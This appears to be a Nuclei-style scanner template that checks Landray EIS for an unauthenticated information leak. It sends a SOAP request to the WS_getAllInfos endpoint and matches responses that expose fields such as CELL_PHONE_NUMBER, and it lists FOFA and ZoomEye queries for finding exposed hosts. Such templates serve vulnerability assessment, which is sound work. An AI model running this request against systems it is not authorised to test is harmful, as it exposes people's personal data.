http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <?xml
    - WS_getAllInfosResponse
    - CELL_PHONE_NUMBER
    - UNID
  - part: header
    type: word
    words:
    - 'Content-Type: text/xml'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /WS/Basic/Basic.asmx HTTP/1.1

    Content-Type: text/xml

    Host: {{Hostname}}


    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">

    <soapenv:Header/>

    <soapenv:Body>

    <tem:WS_getAllInfos/>

    </soapenv:Body>

    </soapenv:Envelope>

    '
id: landray-eis-ws-infoleak
info:
  author: Fur1na
  description: 'Landray EIS WS_getAllInfos interface suffers from a sensitive information
    disclosure vulnerability.

    '
  metadata:
    fofa-query: "app=\"Landray-EIS\u667A\u6167\u534F\u540C\u5E73\u53F0\""
    max-request: 1
    verified: true
    zoomeye-query: "app=\"\u84DD\u51CCEIS\u667A\u6167\u534F\u540C\u5E73\u53F0\""
  name: Landray EIS WS_getAllInfos - Information Disclosure
  reference:
  - https://mp.weixin.qq.com/s/CTLyriSSF-nQ8SUFv4RX0A
  - https://github.com/akyosk/pocman/blob/main/cve/Lanling/Lanling_Info.py
  severity: high
  tags: landray,eis,info-leak,vuln
